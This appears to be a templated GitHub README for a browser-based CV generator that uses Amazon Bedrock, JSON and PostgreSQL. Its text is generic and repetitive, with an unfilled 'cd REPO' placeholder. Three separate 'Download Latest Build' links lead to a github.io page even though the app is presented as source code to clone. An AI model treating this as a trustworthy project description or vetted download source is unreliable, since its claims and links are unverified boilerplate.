# CV Tool - CV Generator 2026

> **CV Tool is a browser-based resume application for creating Wirokit-style CVs, using Amazon Bedrock to extract CV details, converting processed information into JSON, and storing data in PostgreSQL.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/alexbrooksraj1357/cv-tool-cv-generator?style=flat-square)](https://github.com/alexbrooksraj1357/cv-tool-cv-generator)

---

<p align="center">
  <a href="https://alexbrooksraj1357.github.io/cv-tool-cv-generator/">
    <img src="https://img.shields.io/badge/Download-CV%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download CV Tool">
  </a>
</p>

> **[Download CV Tool](https://alexbrooksraj1357.github.io/cv-tool-cv-generator/)**

---

[Download Latest Build](https://alexbrooksraj1357.github.io/cv-tool-cv-generator/)

---

## Overview

CV Tool provides a web-based process for arranging resume details and producing Wirokit-style CVs. Its workflow can extract information from CV content, organize the results as structured data, and use that data to create a CV.

Amazon Bedrock handles CV information extraction, while PostgreSQL supplies persistent data storage. The application also converts processed resume details into JSON, making the resulting structure available for inspection, transfer, and related workflows.

---

## Capabilities

- Build Wirokit-style CVs using structured resume data.
- Extract information from CVs through Amazon Bedrock.
- Represent extracted resume details as JSON.
- Persist CV information in PostgreSQL.
- Support browser-based workflows centered on resume data.
- Preserve extracted details in an organized structure.
- Establish a base for handling more comprehensive CV information.

---

## Getting Started

First, download the source and enter the project directory:

```bash
git clone https://github.com/alexbrooksraj1357/cv-tool-cv-generator.git
cd REPO
```

CV Tool runs as a web application and incorporates PostgreSQL and Amazon Bedrock into its storage and extraction processes. Configure the database connection and Amazon Bedrock settings required by your environment before running the application.

Start the project through the web application entry point or deployment configuration provided in the repository.

---

## Typical Workflow

CV Tool can be used in the following sequence:

1. Access the application through a web browser.
2. Submit the CV information that needs to be processed.
3. Have Amazon Bedrock identify and extract structured CV details.
4. Convert the extracted result into JSON.
5. Save or load the data using PostgreSQL.
6. Produce a Wirokit-style CV from the organized information.

The JSON output provides a structured version of the resume information and can be used in other connected workflows.

---

## Service Configuration

The application depends on runtime settings for its external services. Supply the values appropriate for the deployment environment for:

```text
PostgreSQL connection
Amazon Bedrock access
Web application runtime
```

Do not store service credentials in the repository. Pass them through the configuration system used by the project or its hosting environment. PostgreSQL should be reachable and correctly configured before storage-related functionality is used.

---

## Requirements

- A current web browser.
- A web runtime compatible with the application.
- PostgreSQL for persistent database storage.
- Amazon Bedrock access for extracting CV information.
- Network connectivity to the configured services.
- Sufficient storage for the CV information handled by the deployment.

---

## Frequently Asked Questions

### What kind of CV does CV Tool create?

The application creates Wirokit-style CVs using organized resume information.

### Is JSON export available?

Yes. Processed CV information can be converted into JSON for structured use or integration with other workflows.

### What external services are involved?

The application profile specifies PostgreSQL for storing data and Amazon Bedrock for extracting information from CVs.

### How should application settings be provided?

Use the project's runtime or deployment configuration to supply the required settings. Database credentials and Amazon Bedrock access values should remain outside the committed source.

### What can cause CV extraction to fail?

Check the Amazon Bedrock settings and permissions, network connectivity, service availability, and the format of the CV content being submitted.

### What if CV data cannot be stored?

Make sure the PostgreSQL server can be reached and that the configured connection has the necessary access.

### Where can I find new versions?

Review the repository for project updates and newly available builds:

[View the repository](https://github.com/alexbrooksraj1357/cv-tool-cv-generator)

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
